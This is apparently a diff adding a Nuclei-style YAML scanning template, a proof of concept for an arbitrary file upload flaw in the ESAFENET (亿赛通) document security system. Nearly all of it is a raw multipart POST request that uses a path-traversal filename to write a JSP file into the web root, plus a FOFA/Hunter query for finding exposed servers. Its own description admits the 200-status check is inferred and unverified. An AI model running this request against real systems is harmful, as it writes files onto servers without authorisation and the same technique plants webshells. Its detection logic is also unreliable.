@@ -1,0 +1,43 @@
+id: poc-94193ae7df2ae20ad112
+info:
+  name: 亿赛通电子文档安全管理系统syn_user_policy任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/94193ae7df2ae20ad1121fffeec6e69a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 94193ae7df2ae20ad1121fffeec6e69a
+    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+http:
+- raw:
+  - 'POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    Content-Length: 287
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysebeiskw
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+
+    ------WebKitFormBoundarysebeiskw
+
+    Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\test.jsp"
+
+
+    <% out.println(1111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+    ------WebKitFormBoundarysebeiskw--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
